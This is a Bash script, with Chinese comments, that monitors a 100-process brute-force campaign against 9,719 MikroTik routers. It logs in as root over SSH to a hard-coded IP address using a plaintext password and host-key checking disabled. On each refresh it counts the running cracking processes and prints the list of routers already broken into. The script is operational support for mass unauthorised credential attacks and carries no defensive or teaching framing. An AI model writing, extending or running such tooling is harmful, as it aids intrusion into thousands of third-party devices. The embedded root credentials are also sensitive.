#!/bin/bash
# 实时监控100并发爆破进度

TARGET_IP="82.29.71.156"
TARGET_USER="root"
TARGET_PASS='@admin123'

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}    MikroTik 批量爆破 - 100并发实时监控${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"

while true; do
    clear
    echo -e "${CYAN}━━━━━━━━━━━━━━━━ 运行状态 ━━━━━━━━━━━━━━━━${NC}"
    
    # 进程数
    PROCS=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'ps aux | grep www_bruteforce | grep -v grep | wc -l' 2>/dev/null)
    echo -e "${BLUE}[+] 并发进程:${NC} ${GREEN}${PROCS}${NC}/100"
    
    # 成功数
    SUCCESS=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'find /root/mikrotik_ecsrp5_toolkit/results/ -type f -exec cat {} \; 2>/dev/null | sort -u | wc -l' 2>/dev/null)
    echo -e "${BLUE}[+] 已破解:${NC} ${GREEN}${SUCCESS}${NC} 个路由器"
    
    # CPU负载
    LOAD=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'uptime | awk -F"load average:" "{print \$2}"' 2>/dev/null)
    echo -e "${BLUE}[+] 系统负载:${NC}${LOAD}"
    
    echo -e "\n${GREEN}━━━━━━━━━━━━━━━━ 成功列表 ━━━━━━━━━━━━━━━━${NC}"
    sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'find /root/mikrotik_ecsrp5_toolkit/results/ -type f -exec cat {} \; 2>/dev/null | sort -u | nl' 2>/dev/null
    
    echo -e "\n${YELLOW}[i] 目标总数: 9719${NC}"
    echo -e "${YELLOW}[i] 5秒后自动刷新... (Ctrl+C 退出)${NC}"
    sleep 5
done
